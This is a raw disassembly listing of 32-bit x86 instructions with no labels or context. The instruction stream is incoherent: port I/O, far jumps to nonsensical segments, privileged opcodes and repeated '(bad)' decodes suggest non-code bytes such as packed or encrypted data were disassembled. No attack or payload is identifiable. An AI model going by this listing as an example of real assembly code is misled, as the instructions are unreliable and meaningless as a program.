  41bb37:	jl     0x41bb73
  41bb39:	or     BYTE PTR [edi],bh
  41bb3b:	xor    eax,0x15db7545
  41bb40:	mov    esp,0x60d3e580
  41bb45:	inc    cl
  41bb47:	sahf   
  41bb48:	adc    eax,DWORD PTR [edi]
  41bb4a:	adc    eax,0xed36b33e
  41bb4f:	adc    ecx,DWORD PTR [esi]
  41bb51:	fisttp WORD PTR [eax+0x3d]
  41bb54:	imul   ecx,edx,0xe03e0146
  41bb5a:	repnz leave 
  41bb5c:	pop    eax
  41bb5d:	push   es
  41bb5e:	xor    ebx,0xe2f6387d
  41bb64:	inc    edx
  41bb65:	pop    edi
  41bb66:	sub    al,0xf7
  41bb68:	lock xor DWORD PTR [ebx+0x7c7f63b6],esi
  41bb6f:	shl    esp,cl
  41bb71:	xchg   BYTE PTR [edi-0x7a],al
  41bb74:	enter  0x3aaf,0x1e
  41bb78:	sbb    eax,0x8f3d4b75
  41bb7d:	xor    eax,0xf42cf47
  41bb82:	in     al,dx
  41bb83:	mov    ah,0x46
  41bb85:	pop    esp
  41bb86:	loopne 0x41bb9d
  41bb88:	sbb    BYTE PTR [eax-0x30aaf265],0x5
  41bb8f:	inc    ecx
  41bb90:	push   cs
  41bb91:	xchg   edx,eax
  41bb92:	fmul   st(3),st
  41bb94:	xchg   BYTE PTR [ecx],dh
  41bb96:	dec    edx
  41bb97:	xchg   edx,eax
  41bb98:	scas   al,BYTE PTR es:[edi]
  41bb99:	sbb    DWORD PTR [esi-0x630654c],0xffffff93
  41bba0:	mov    WORD PTR ds:0xe4d97f3b,?
  41bba6:	inc    edx
  41bba7:	xchg   edi,eax
  41bba8:	repnz add ebp,0xffffffeb
  41bbac:	cmp    dh,BYTE PTR ds:0x5a5c261a
  41bbb2:	cld    
  41bbb3:	mov    ah,0xe5
  41bbb5:	add    DWORD PTR [esi+esi*2+0x606d9f75],ecx
  41bbbc:	stos   DWORD PTR es:[edi],eax
  41bbbd:	das    
  41bbbe:	mov    cl,0x3f
  41bbc0:	out    0x85,al
  41bbc2:	push   edx
  41bbc3:	push   esi
  41bbc4:	out    0x2d,al
  41bbc6:	sbb    cl,ah
  41bbc8:	cmp    al,0xfb
  41bbca:	jmp    0x41bba5
  41bbcc:	imul   bl
  41bbce:	stos   BYTE PTR es:[edi],al
  41bbcf:	adc    BYTE PTR [esi-0x5ca90ffe],0xa3
  41bbd6:	call   0x28563a7a
  41bbdb:	in     eax,0xd9
  41bbdd:	stos   BYTE PTR es:[edi],al
  41bbde:	mov    bh,0xa4
  41bbe0:	outs   dx,DWORD PTR ds:[esi]
  41bbe1:	mov    eax,ds:0x83a7015b
  41bbe6:	in     eax,0xfc
  41bbe8:	add    bh,BYTE PTR [ebp+0x71]
  41bbeb:	stc    
  41bbec:	outs   dx,BYTE PTR ds:[esi]
  41bbed:	cld    
  41bbee:	inc    edx
  41bbef:	dec    eax
  41bbf0:	test   eax,0xf8e0521d
  41bbf5:	jno    0x41bb89
  41bbf7:	popa   
  41bbf8:	adc    al,0x4d
  41bbfa:	enter  0x5034,0x1e
  41bbfe:	sub    DWORD PTR [esp+edx*2],esi
  41bc01:	sub    DWORD PTR [eax],esp
  41bc03:	clc    
  41bc04:	xchg   edi,eax
  41bc05:	xlat   BYTE PTR ds:[ebx]
  41bc06:	cmp    DWORD PTR [esi+0x36],edx
  41bc09:	es int 0x38
  41bc0c:	outs   dx,DWORD PTR ds:[esi]
  41bc0d:	ins    BYTE PTR es:[edi],dx
  41bc0e:	mov    bh,0xbd
  41bc10:	adc    al,0x46
  41bc12:	cmp    DWORD PTR [edi],0x3793edde
  41bc18:	std    
  41bc19:	add    al,0xdd
  41bc1b:	(bad)  
  41bc1c:	xor    al,BYTE PTR [ebx+0x35]
  41bc1f:	xchg   dh,al
  41bc21:	das    
  41bc22:	jmp    0x8463:0x68e1a1a6
  41bc29:	cmp    al,0x32
  41bc2b:	(bad)
  41bc2f:	mov    ds:0x6335b1b0,al
  41bc34:	or     edi,DWORD PTR [eax-0x292d5d87]
  41bc3a:	sbb    al,0x36
  41bc3c:	dec    eax
  41bc3d:	fxch   st(0)
  41bc3f:	or     al,al
  41bc41:	popf   
  41bc42:	das    
  41bc43:	fild   QWORD PTR [esi]
  41bc45:	test   al,0xd5
  41bc47:	cmc    
  41bc48:	adc    DWORD PTR [esi-0x1b709c3e],ecx
  41bc4e:	inc    ebx
  41bc4f:	or     eax,0x5826c7f9
  41bc54:	repz into 
  41bc56:	lock out 0x5a,al
  41bc59:	jns    0x41bc30
  41bc5b:	in     al,0x74
  41bc5d:	adc    eax,0x4ed94cef
  41bc62:	or     DWORD PTR [ebp+ebp*2+0x25],ebp
  41bc66:	shl    DWORD PTR ds:0x72262cc0,cl
  41bc6c:	pop    esp
  41bc6d:	outs   dx,BYTE PTR ds:[esi]
  41bc6e:	cs std 
  41bc70:	(bad)  
  41bc71:	add    BYTE PTR [edx],dh
  41bc73:	xchg   BYTE PTR [edi+0x6b],al
  41bc76:	push   0xd5934ac2
  41bc7b:	sar    dl,0xd6
  41bc7e:	dec    edi
  41bc7f:	add    al,0xd2
  41bc81:	mov    eax,ds:0x59eb9019
  41bc86:	push   eax
  41bc87:	psubusb mm4,mm5
  41bc8a:	fucom  st(5)
  41bc8c:	and    ebp,ebp
  41bc8e:	push   cs
  41bc8f:	mov    al,ds:0xd237acae
  41bc94:	sahf   
  41bc95:	mov    cl,0x7d
  41bc97:	push   ecx
  41bc98:	test   BYTE PTR [edi+0x40a00646],cl
  41bc9e:	pop    edi
  41bc9f:	cmp    DWORD PTR [edi+0x4a],edx
  41bca2:	sub    BYTE PTR [esi+0x78],bh
  41bca5:	ret    
  41bca6:	ret    0x4424
  41bca9:	outs   dx,DWORD PTR ds:[esi]
  41bcaa:	in     eax,dx
  41bcab:	into   
  41bcac:	jne    0x41bc7c
  41bcae:	lock push edx
  41bcb0:	sbb    DWORD PTR [edi+ecx*2],0xe8e09d16
  41bcb7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bcb8:	loop   0x41bcc0
  41bcba:	repz xchg ebp,eax
  41bcbc:	mov    esp,0xcf0e7d9c
  41bcc1:	data16 movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bcc3:	jg     0x41bc5a
  41bcc5:	ds jge 0x41bce4
  41bcc8:	jb     0x41bcee
  41bcca:	je     0x41bd49
  41bccc:	je     0x41bce7
  41bcce:	inc    ebp
  41bccf:	es aaa 
  41bcd1:	xor    al,0x94
  41bcd3:	add    ebx,0xffffff9c
  41bcd6:	mov    BYTE PTR [eax-0x578afe79],dl
  41bcdc:	add    ecx,ebp
  41bcde:	xchg   ebx,eax
  41bcdf:	jg     0x41bc85
  41bce1:	fimul  WORD PTR ds:0xc1016d67
  41bce7:	outs   dx,DWORD PTR ds:[esi]
  41bce8:	push   ss
  41bce9:	repnz sbb al,0xba
  41bcec:	push   esi
  41bced:	lods   al,BYTE PTR ds:[esi]
  41bcee:	inc    ecx
  41bcef:	jns    0x41bcd3
  41bcf1:	push   cs
  41bcf2:	cmp    esp,esi
  41bcf4:	fiadd  DWORD PTR [ebx]
  41bcf6:	out    0xf,eax
  41bcf8:	xlat   BYTE PTR ds:[ebx]
  41bcf9:	xor    DWORD PTR [ebx+0x50a5c436],edi
  41bcff:	push   ds
  41bd00:	or     esi,edx
  41bd02:	fild   DWORD PTR [eax+0x7852f7c8]
  41bd08:	lahf   
  41bd09:	inc    ebx
  41bd0a:	mov    al,0xb9
  41bd0c:	pusha  
  41bd0d:	aam    0x28
  41bd0f:	xchg   cl,bl
  41bd11:	pop    ebp
  41bd12:	mov    edx,ecx
  41bd14:	stc    
  41bd15:	inc    ecx
  41bd16:	add    eax,0x7792e0fe
  41bd1b:	jns    0x41bd56
  41bd1d:	shl    esi,cl
  41bd1f:	in     eax,0x70
  41bd21:	jmp    0x78846a3d
  41bd26:	xchg   ebp,eax
  41bd27:	test   BYTE PTR [esp+edi*1-0x242a99db],cl
  41bd2e:	push   edx
  41bd2f:	jnp    0x41bda9
  41bd31:	mov    edi,0x23fa7083
  41bd36:	outs   dx,BYTE PTR ds:[esi]
  41bd37:	lods   al,BYTE PTR ds:[esi]
  41bd38:	mov    bl,0x29
  41bd3a:	and    cl,BYTE PTR [ecx+0x268206e4]
  41bd40:	push   esp
  41bd41:	xchg   esp,eax
  41bd42:	inc    edi
  41bd43:	jg     0x41bcc6
  41bd45:	test   DWORD PTR [ebx-0x26],esp
  41bd48:	or     eax,0x42f21e4e
  41bd4d:	jmp    FWORD PTR [esp+ebp*1+0x28115cd5]
  41bd54:	xor    ah,BYTE PTR [ebx+ebx*8-0x5f]
  41bd58:	add    dl,bl
  41bd5a:	call   0xd67171cb
  41bd5f:	xchg   esp,eax
  41bd60:	pop    esi
  41bd61:	dec    esp
  41bd62:	jae    0x41bd80
  41bd64:	sub    bl,BYTE PTR [edi-0x6c39781b]
  41bd6a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bd6b:	adc    ebp,DWORD PTR [ecx*8+0x3ec3a93a]
  41bd72:	loop   0x41bd41
  41bd74:	jmp    0x314d04e7
  41bd79:	out    dx,al
  41bd7a:	aad    0x63
  41bd7c:	add    BYTE PTR [ecx-0x56],ah
  41bd7f:	jl     0x41bd1f
  41bd81:	adc    eax,0xc3cfbca3
  41bd86:	push   ds
  41bd87:	or     al,0xa6
  41bd89:	pushf  
  41bd8a:	jmp    0x41bd2c
  41bd8c:	pop    edx
  41bd8d:	int3   
  41bd8e:	and    al,0x15
  41bd90:	cmp    eax,0x95616015
  41bd95:	pop    ebp
  41bd96:	cld    
  41bd97:	les    ebp,FWORD PTR [ebp-0x55]
  41bd9a:	pusha  
  41bd9b:	mov    BYTE PTR [ebp+0x7f],ch
  41bd9e:	loop   0x41bda9
  41bda0:	mov    eax,ds:0x8a0b2856
  41bda5:	or     ebx,ebp
  41bda7:	pop    eax
  41bda8:	or     dl,BYTE PTR [edx]
  41bdaa:	xchg   edi,eax
  41bdab:	cmp    al,BYTE PTR [ecx+0x2227cb70]
  41bdb1:	mov    ecx,0x90dfe379
  41bdb6:	pop    ebp
  41bdb7:	dec    ebx
  41bdb8:	mov    edi,0x220bff92
  41bdbd:	mov    ebp,0x27e19b07
  41bdc2:	ret    0x8de6
  41bdc5:	sbb    al,0xb7
  41bdc7:	adc    bh,bh
  41bdc9:	stos   BYTE PTR es:[di],al
  41bdcb:	pushf  
  41bdcc:	sti    
  41bdcd:	push   edx
  41bdce:	mov    edi,0x836e8452
  41bdd3:	rol    esi,1
  41bdd5:	cmp    eax,0xffb7ef0d
  41bdda:	ss mov ch,0xd4
  41bddd:	jmp    0xdacf:0xe53c5cfc
  41bde4:	lock dec ebp
  41bde6:	mov    cl,BYTE PTR [esi-0x7440760f]
  41bdec:	mov    fs,WORD PTR [edi]
  41bdee:	mov    ch,BYTE PTR [ecx+0x6e]
  41bdf1:	pop    ecx
  41bdf2:	jno    0x41bdfb
  41bdf4:	cmp    ch,BYTE PTR [edx+edx*8]
  41bdf7:	dec    edx
  41bdf8:	ins    DWORD PTR es:[edi],dx
  41bdf9:	push   edx
  41bdfa:	gs push esp
  41bdfc:	sbb    DWORD PTR [eax+esi*1+0x3a],ebx
  41be00:	int3   
  41be01:	and    dh,BYTE PTR [edx]
  41be03:	mov    dh,0x55
  41be05:	pop    ecx
  41be06:	cmp    cl,BYTE PTR [ecx]
  41be08:	mov    BYTE PTR [edx-0xb],bh
  41be0b:	cs pop esp
  41be0d:	jmp    0x3f85baa4
  41be12:	adc    BYTE PTR [edi+0x416b5deb],al
  41be18:	and    DWORD PTR [ecx],ecx
  41be1a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41be1b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41be1c:	xor    BYTE PTR [ebx],ch
  41be1e:	lds    eax,FWORD PTR [edi-0x4ff69d16]
  41be24:	mov    ah,0xe8
  41be26:	sub    bh,BYTE PTR [ecx-0x439de9e8]
  41be2c:	out    0x2d,al
  41be2e:	mov    edx,0x15a78483
  41be33:	out    0xf3,eax
  41be35:	sbb    ebp,DWORD PTR [ebp-0x4465e1e0]
  41be3b:	jmp    0x828b:0x38d62658
  41be42:	xlat   BYTE PTR ds:[ebx]
  41be43:	retf   0x4416
  41be46:	or     al,0xef
  41be48:	icebp  
  41be49:	jge    0x41be0a
  41be4b:	mov    ebx,DWORD PTR [esi-0x61]
  41be4e:	ret    0x9cbf
  41be51:	or     al,0x17
  41be53:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41be54:	adc    DWORD PTR [eax+0x221f5ff9],eax
  41be5a:	sub    DWORD PTR [edx],esp
  41be5c:	inc    BYTE PTR [ecx+0x7]
  41be5f:	dec    ebx
  41be60:	and    cl,BYTE PTR [edi+0x48]
  41be63:	and    ebp,ecx
  41be65:	xchg   ecx,eax
  41be66:	xlat   BYTE PTR ds:[ebx]
  41be67:	jmp    0xdfa9557c
  41be6c:	pop    esi
  41be6d:	mov    al,ds:0xb45a7a91
  41be72:	pop    ss
  41be73:	sar    eax,1
  41be75:	cdq    
  41be76:	and    al,0xbc
  41be78:	mov    al,ds:0x183b88cf
  41be7d:	push   edi
  41be7e:	stos   BYTE PTR es:[edi],al
  41be7f:	repnz xor DWORD PTR [esi+0x5a16cdf0],esp
  41be86:	popf   
  41be87:	outs   dx,BYTE PTR ds:[esi]
  41be88:	into   
  41be89:	cmp    al,BYTE PTR [ecx+0x5e6019bd]
  41be8f:	jns    0x41bef7
  41be91:	jnp    0x41beb9
  41be93:	in     eax,0x2c
  41be95:	adc    eax,DWORD PTR [edi-0x7d]
  41be98:	ins    DWORD PTR es:[edi],dx
  41be99:	(bad)  
  41be9b:	sbb    ah,dh
  41be9d:	jl     0x41beb1
  41be9f:	test   al,0x29
  41bea1:	test   eax,0x46d2d455
  41bea6:	rol    ah,0xb6
  41bea9:	ret    
  41beaa:	aas    
  41beab:	mov    eax,DWORD PTR [ebx]
  41bead:	mov    esi,DWORD PTR [edx+eax*1]
  41beb0:	nop
  41beb1:	es fwait
  41beb3:	mov    cl,0x33
  41beb5:	add    eax,0x6f820f90
  41beba:	(bad)  
  41bebb:	push   eax
  41bebc:	popa   
  41bebd:	jecxz  0x41bf39
  41bebf:	push   edi
  41bec0:	push   edx
  41bec1:	fld    st(7)
  41bec3:	mov    WORD PTR [eax-0x1b76fb3f],?
  41bec9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41beca:	fisub  WORD PTR [edx]
  41becc:	cmp    eax,0x9781a673
  41bed1:	xor    DWORD PTR [edx+0x5eaba0ca],edx
  41bed7:	or     eax,0xf84c925f
  41bedc:	or     eax,0x217d0290
  41bee1:	fld    QWORD PTR [edx-0x4c35ae5e]
  41bee7:	addr16 (bad) 
  41bee9:	retf   
  41beea:	sub    DWORD PTR [edx],esp
  41beec:	cld    
  41beed:	cmp    al,0xe6
  41beef:	stc    
  41bef0:	cld    
  41bef1:	out    0x71,eax
  41bef3:	xchg   ecx,eax
  41bef4:	jge    0x41bedd
  41bef6:	xor    DWORD PTR [eax+0x49e2bad8],ebp
  41befc:	xchg   ecx,eax
  41befd:	mov    ds:0xd85c6b8,al
  41bf02:	fimul  WORD PTR [ebx-0x70]
  41bf05:	xor    ah,0x5c
  41bf08:	xor    DWORD PTR [eax-0x56],ebx
  41bf0b:	or     al,0x5e
  41bf0d:	popf   
  41bf0e:	mov    cl,0x8f
  41bf10:	or     eax,0xc7a4d1e1
  41bf15:	push   ss
  41bf16:	add    edi,eax
  41bf18:	(bad)  
  41bf19:	fimul  DWORD PTR [edx+0x9]
  41bf1c:	sub    DWORD PTR [ecx],esi
  41bf1e:	cs test eax,0xae8c5035
  41bf24:	jno    0x41bf67
  41bf26:	je     0x41beba
  41bf28:	popa   
  41bf29:	arpl   bp,bx
  41bf2b:	call   0x9531:0xc406e79c
  41bf32:	jae    0x41becc
  41bf34:	pmaxsw mm6,QWORD PTR [ebx]
  41bf37:	xchg   ebx,eax
  41bf38:	int3   
  41bf39:	jecxz  0x41bf71
  41bf3b:	jmp    0x5339:0x19f016aa
  41bf42:	call   FWORD PTR [eax-0x7ae9aae5]
  41bf48:	cmc    
  41bf49:	cmp    ebp,DWORD PTR [eax+0x1a]
  41bf4c:	pop    ecx
  41bf4d:	mov    bl,0x12
  41bf4f:	push   0x25
  41bf51:	lea    esp,[ecx]
  41bf53:	icebp  
  41bf54:	scas   al,BYTE PTR es:[edi]
  41bf55:	ds inc ecx
  41bf57:	push   0xffffffb4
  41bf59:	add    BYTE PTR [ebx+0x32],dl
  41bf5c:	addr16 pop es
  41bf5e:	jl     0x41bf8f
  41bf60:	dec    esi
  41bf61:	ss out 0x7b,eax
  41bf64:	out    0x24,al
  41bf66:	stc    
  41bf67:	les    esp,FWORD PTR ds:0xab61b5d1
  41bf6d:	test   DWORD PTR [ebp-0x502e77e9],0x7e619568
  41bf77:	cmp    al,0x68
  41bf79:	sub    al,0x2a
  41bf7b:	jg     0x41bfdd
  41bf7d:	loopne 0x41bf4d
  41bf7f:	ja     0x41bfa2
  41bf81:	xor    eax,DWORD PTR [ebx]
  41bf83:	fsub   QWORD PTR [esi+0x6e]
  41bf86:	mov    edx,0x3b41ba4b
  41bf8b:	push   0x77
  41bf8d:	es aam 0xc0
  41bf90:	jns    0x41bf41
  41bf92:	sub    eax,0x4825138b
  41bf97:	mov    bh,0x6e
  41bf99:	(bad)  
  41bf9a:	and    ebp,DWORD PTR [edi-0x5]
  41bf9d:	sbb    eax,0xd267d88e
  41bfa2:	jge    0x41bfaa
  41bfa4:	dec    esp
  41bfa5:	or     ebx,esi
  41bfa7:	inc    ecx
  41bfa8:	cmp    esp,DWORD PTR [ebx+0x0]
  41bfab:	sbb    edx,DWORD PTR [esi+0x19aaf549]
  41bfb1:	sub    al,0x4a
  41bfb3:	adc    BYTE PTR [ecx-0x5],al
  41bfb6:	mov    ch,0xbb
  41bfb8:	push   ecx
  41bfb9:	sub    eax,0xbf4de860
  41bfbe:	(bad)  
  41bfbf:	es jecxz 0x41bf5d
  41bfc2:	inc    esi
  41bfc3:	cdq    
  41bfc4:	ficomp DWORD PTR [esi+0x34]
  41bfc7:	or     ebx,DWORD PTR [ebp-0xfd9a3c]
  41bfcd:	and    al,0xa4
  41bfcf:	hlt    
  41bfd0:	push   cs
  41bfd1:	enter  0xe29c,0xf7
  41bfd5:	fld    DWORD PTR [esp+ebx*2]
  41bfd8:	jl     0x41bf87
  41bfda:	ss stc 
  41bfdc:	cwde   
  41bfdd:	push   0x6437449a
  41bfe2:	push   ebx
  41bfe3:	rcl    al,1
  41bfe5:	mov    ss,WORD PTR [ecx+esi*2-0x3de961ae]
  41bfec:	xchg   esi,eax
  41bfed:	pop    esi
  41bfee:	test   eax,0x28c2c688
  41bff3:	mov    DWORD PTR [edx],ebp
  41bff5:	data16 movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bff7:	mov    ds:0x2f69c5f2,al
  41bffc:	xor    edi,esi
  41bffe:	xor    eax,0x63665c80
  41c003:	in     eax,dx
  41c004:	inc    ebp
  41c005:	xor    ah,BYTE PTR [ebp+0x36]
  41c008:	jbe    0x41c00a
  41c00a:	inc    ecx
  41c00b:	add    esp,DWORD PTR [esi+eiz*4-0x8d66248]
  41c012:	out    0x92,eax
  41c014:	iret   
  41c015:	dec    esp
  41c016:	aad    0x5b
  41c018:	popa   
  41c019:	cs mov esi,0xa2320463
  41c01f:	sub    esp,DWORD PTR [edx]
  41c021:	call   0xb82b8411
  41c026:	rcr    DWORD PTR [edi],1
  41c028:	rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c02a:	sub    eax,0x333124f7
  41c02f:	inc    ecx
  41c030:	lods   eax,DWORD PTR ds:[esi]
  41c031:	sbb    al,0xfa
  41c033:	pushf  
  41c034:	or     ch,dh
  41c036:	jmp    0xa75d:0x5a608d2b
  41c03d:	and    ch,al
  41c03f:	jmp    0x9f4f:0x560286cb
  41c046:	and    eax,0x356c76d9
  41c04b:	sub    al,0xa0
  41c04d:	inc    ebx
  41c04e:	ds es loop 0x41c0b7
  41c052:	mov    edi,0xd1ec3bb1
  41c057:	xor    eax,0x1df74a2e
  41c05c:	push   0x23aedb73
  41c061:	retf   0x3b65
  41c064:	mov    ds:0x295e6156,eax
  41c069:	scas   eax,DWORD PTR es:[edi]
  41c06a:	cli    
  41c06b:	in     eax,0x44
  41c06d:	stos   BYTE PTR es:[edi],al
  41c06e:	sbb    al,0x6
  41c070:	sbb    DWORD PTR [ebp-0x6d4e6308],edi
  41c076:	pusha  
  41c077:	jb     0x41c0e3
  41c079:	cli    
  41c07a:	dec    ecx
  41c07b:	arpl   WORD PTR [edx+ebp*8+0x637299e4],sp
  41c082:	xor    al,0x14
  41c084:	fistp  QWORD PTR [ebx-0xdccd4f7]
  41c08a:	xor    bl,BYTE PTR [esi]
  41c08c:	pop    DWORD PTR [ebp-0x39b7402d]
  41c092:	ins    BYTE PTR es:[edi],dx
  41c093:	mov    eax,ds:0x78d8f126
  41c098:	test   DWORD PTR [ebx],esp
  41c09a:	fcomi  st,st(2)
  41c09c:	cs repz repnz (bad) 
  41c0a0:	mov    WORD PTR [edi-0x53],ss
  41c0a3:	jae    0x41c11b
  41c0a5:	inc    ecx
  41c0a6:	inc    esi
  41c0a7:	js     0x41c04a
  41c0a9:	repz dec esi
  41c0ab:	sahf   
  41c0ac:	sbb    eax,0xb9d620db
  41c0b1:	stc    
  41c0b2:	cmp    al,0x69
  41c0b4:	mov    ah,0xc5
  41c0b6:	or     ebx,DWORD PTR [eax+esi*4-0x6c]
  41c0ba:	push   cs
  41c0bb:	adc    eax,0x4d9f847d
  41c0c0:	rcl    edi,1
  41c0c2:	add    ecx,DWORD PTR [eax+eiz*8-0x237ffc99]
  41c0c9:	daa    
  41c0ca:	adc    edx,edx
  41c0cc:	add    bl,ch
  41c0ce:	test   eax,0x72f73712
  41c0d3:	mov    edx,0x294f971c
  41c0d8:	or     eax,0x9175d63d
  41c0dd:	jnp    0x41c103
  41c0df:	add    eax,ebx
  41c0e1:	xor    ebx,DWORD PTR [esi-0xe4c391d]
  41c0e7:	mov    cl,bh
  41c0e9:	cdq    
  41c0ea:	arpl   WORD PTR ds:0xfd1e2722,bp
  41c0f0:	cmp    DWORD PTR [ebp+eax*4+0x3aa8475b],edx
  41c0f7:	push   ebx
  41c0f8:	stc    
  41c0f9:	pop    ecx
  41c0fa:	cmp    BYTE PTR [ebx+edi*8],al
  41c0fd:	shl    BYTE PTR ds:0xc572e904,0xb9
  41c104:	ror    DWORD PTR gs:[edx-0x22],1
  41c108:	push   es
  41c109:	pop    ebp
  41c10a:	call   0xdc287f4b
  41c10f:	xchg   esi,eax
  41c110:	outs   dx,DWORD PTR ds:[esi]
  41c111:	adc    BYTE PTR [esi-0x1b788754],0x52
  41c118:	jae    0x41c188
  41c11a:	jmp    0x41c0ef
  41c11c:	outs   dx,BYTE PTR ds:[esi]
  41c11d:	std    
  41c11e:	mov    al,0xe9
  41c120:	js     0x41c126
  41c122:	and    al,0xd8
  41c124:	pop    esp
  41c125:	and    BYTE PTR [ecx-0x3f],dh
  41c128:	pop    ebp
  41c129:	inc    edx
  41c12a:	fwait
  41c12b:	dec    edi
  41c12c:	push   esi
  41c12d:	jmp    0x9b38395e
  41c132:	scas   al,BYTE PTR es:[edi]
  41c133:	cmp    DWORD PTR [esi+0x5e],eax
  41c136:	jbe    0x41c1a2
  41c138:	leave  
  41c139:	mov    ebp,0x3ea28475
  41c13e:	cmp    bl,dh
  41c140:	pop    ecx
  41c141:	ret    0xec86
  41c144:	jmp    0x41c135
  41c146:	aaa    
  41c147:	(bad)  
  41c148:	icebp  
  41c149:	add    BYTE PTR [eax+0x679695a1],0xbd
  41c150:	xlat   BYTE PTR ds:[ebx]
  41c151:	mov    edi,0xf2316dd3
  41c156:	dec    edx
  41c157:	mov    ebp,0x2fc14f2c
  41c15c:	aam    0xfa
  41c15e:	loopne 0x41c115
  41c160:	jg     0x41c165
  41c162:	sub    eax,0x35bb8ab9
  41c167:	cmp    eax,0xa75d08fd
  41c16c:	call   0x1a8a:0xe33c8a2f
  41c173:	pop    esp
  41c174:	in     al,dx
  41c175:	xor    bh,BYTE PTR [edx]
  41c177:	pop    edi
  41c178:	adc    BYTE PTR [edi+0x4a4441ef],al
  41c17e:	jno    0x41c1f2
  41c180:	xor    al,0x5a
  41c182:	daa    
  41c183:	fld    TBYTE PTR [esi]
  41c185:	xchg   edi,eax
  41c186:	cmp    DWORD PTR cs:[esi+0x7b],ebp
  41c18a:	aam    0x5d
  41c18c:	stc    
  41c18d:	fisub  DWORD PTR [edi+ebp*2+0x4a]
  41c191:	adc    esi,ebx
  41c193:	aam    0x89
  41c195:	inc    eax
  41c196:	out    dx,eax
  41c197:	push   cs
  41c198:	push   ebx
  41c199:	sbb    BYTE PTR [eax+0x11679a27],0x5
  41c1a0:	mov    esi,0x6ee27225
  41c1a5:	or     edx,eax
  41c1a7:	push   ebx
  41c1a8:	fxch   st(4)
  41c1aa:	outs   dx,DWORD PTR ds:[esi]
  41c1ab:	sbb    eax,0x3edef436
  41c1b0:	mov    bl,0xe2
  41c1b2:	clc    
  41c1b3:	push   esp
  41c1b4:	sbb    eax,0xde2a138
  41c1b9:	ins    DWORD PTR es:[edi],dx
  41c1ba:	icebp  
  41c1bb:	les    esi,FWORD PTR [ecx+0x6a085d4a]
  41c1c1:	arpl   WORD PTR [eax-0xb400568],bp
  41c1c7:	or     eax,0x8d046c2b
  41c1cc:	mov    ds:0x3dbf0242,eax
  41c1d1:	loop   0x41c163
  41c1d3:	rcr    esp,1
  41c1d5:	push   ecx
  41c1d6:	sbb    edi,DWORD PTR [ebx-0x2edc6c0f]
  41c1dc:	or     BYTE PTR [edi-0x52e3927f],0xea
  41c1e3:	or     ecx,eax
  41c1e5:	dec    esp
  41c1e6:	pop    esi
  41c1e7:	mov    esp,esp
  41c1e9:	in     eax,0xf4
  41c1eb:	sar    DWORD PTR [esi-0x39],cl
  41c1ee:	fbld   TBYTE PTR [ebp+0x50]
  41c1f1:	imul   BYTE PTR [ebp-0x35]
  41c1f4:	xchg   DWORD PTR [edi],ebp
  41c1f6:	nop
  41c1f7:	inc    edx
  41c1f8:	xchg   esi,eax
  41c1f9:	jnp    0x41c1ad
  41c1fb:	pop    esi
  41c1fc:	jle    0x41c1f5
  41c1fe:	cmp    al,0x9a
  41c200:	xor    al,0x55
  41c202:	or     al,BYTE PTR [ebp-0x6149deb4]
  41c208:	test   eax,0x528363a6
  41c20d:	xchg   edi,eax
  41c20e:	jecxz  0x41c257
  41c210:	jge    0x41c1e0
  41c212:	adc    dl,ch
  41c214:	add    bh,BYTE PTR [edx+0x62]
  41c217:	aas    
  41c218:	or     edx,ebx
  41c21a:	mov    BYTE PTR [eax-0x1eaa00af],bl
  41c220:	add    BYTE PTR [edx-0xc],cl
  41c223:	ret    
  41c224:	sbb    cl,0x97
  41c227:	sti    
  41c228:	popf   
  41c229:	inc    esp
  41c22a:	jg     0x41c1d2
  41c22c:	inc    edi
  41c22d:	mov    BYTE PTR [ebp-0x6bcc2acd],0xb1
  41c234:	xchg   esp,eax
  41c235:	es push ds
  41c237:	popa   
  41c238:	add    al,0xfa
  41c23a:	loopne 0x41c272
  41c23c:	xor    ebx,ebx
  41c23e:	ins    DWORD PTR es:[edi],dx
  41c23f:	imul   ebp,DWORD PTR [eax-0x80],0xffffffb0
  41c243:	dec    esp
  41c244:	pop    ds
  41c245:	mov    ebx,0x70204bdb
  41c24a:	adc    DWORD PTR [ecx],0x9f919e8
  41c250:	enter  0xebfc,0xd5
  41c254:	or     DWORD PTR [edx-0xf],eax
  41c257:	sub    eax,eax
  41c259:	fisubr DWORD PTR [ebp-0x3a6f206]
  41c25f:	mov    cl,0xc0
  41c261:	inc    eax
  41c262:	cs mov ebp,0x8c81c8c5
  41c268:	cmp    edi,DWORD PTR [ebx-0x2a619ce6]
  41c26e:	or     dh,BYTE PTR [ecx]
  41c270:	loopne 0x41c26a
  41c272:	ds add eax,0xd89eda0d
  41c278:	sbb    esp,DWORD PTR [edx]
  41c27a:	ins    DWORD PTR es:[edi],dx
  41c27b:	inc    ecx
  41c27c:	mov    al,0xf5
  41c27e:	mov    ebp,0xb0812c07
  41c283:	push   ecx
  41c284:	or     al,0x56
  41c286:	aas    
  41c287:	cmp    al,0x8b
  41c289:	push   esi
  41c28a:	out    dx,eax
  41c28b:	nop
  41c28c:	dec    ebx
  41c28d:	jns    0x41c217
  41c28f:	aas    
  41c290:	inc    eax
  41c291:	jb     0x41c28b
  41c293:	jp     0x41c25b
  41c295:	add    ch,BYTE PTR [ebp+0x41a01aa6]
  41c29b:	jnp    0x41c28e
  41c29d:	mov    edi,es
  41c29f:	adc    DWORD PTR [edx+0x7161ad34],edx
  41c2a5:	das    
  41c2a6:	bound  esi,QWORD PTR [ecx]
  41c2a8:	iret   
  41c2a9:	and    DWORD PTR [esi+0x25b5ad9f],ebx
  41c2af:	popa   
  41c2b0:	mov    dl,0x41
  41c2b2:	and    eax,eax
  41c2b4:	(bad)  
  41c2b5:	popf   
  41c2b6:	pop    ebx
  41c2b7:	fld    st(6)
  41c2b9:	nop
  41c2ba:	jecxz  0x41c305
  41c2bc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c2bd:	sbb    ah,BYTE PTR ds:0x4cfeecbd
  41c2c3:	(bad)  
  41c2c5:	dec    eax
  41c2c6:	xor    eax,0x64724476
  41c2cb:	pop    ebp
  41c2cc:	stos   DWORD PTR es:[edi],eax
  41c2cd:	dec    edx
  41c2ce:	std    
